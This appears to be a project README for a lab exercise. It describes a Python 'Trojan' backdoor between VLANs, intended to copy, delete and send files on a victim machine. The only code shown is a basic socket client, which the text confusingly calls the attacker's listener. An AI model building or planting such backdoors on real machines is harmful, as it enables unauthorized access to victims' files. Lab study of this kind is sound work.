# Back door attack AAA
in this topology we are going to use python scripts as a Trajon to create a back door on the victim computer
to copy files from victim machine, delete files on this target, send file to this machine etc.


# :zap: How this works :zap: 
:star: Step 1: Firs, imagine that this target has downloaded a file from internet and inside this file there is a Trojan file that need to be 
executed to create a connection from target machine to our computer, then we are ready to go. 

in this topology, the computers are in different vlans, and we are going to create the back door from PC called Target to the hacker's computer called attacker. 

##
<img src=images/3.PNG  alt="alt text" width="950" height="550">

##


# :zap: Waiting for target to execute :zap: 

:star: Here the attacker by running this part of command start listening the to his port waiting for 
any incoming connection:
```python
#!/usr/bin/python
import os
import socket

s = socket.socket()
port = 8080
host = "127.0.0.1"
host = input (str("Please enter the server address : "))


s.connect((host,port))

print (" ")
print (" Connected to the server successfully")
print (" ")

```
##
<img src=images/4.PNG  alt="alt text" width="950" height="550">

##

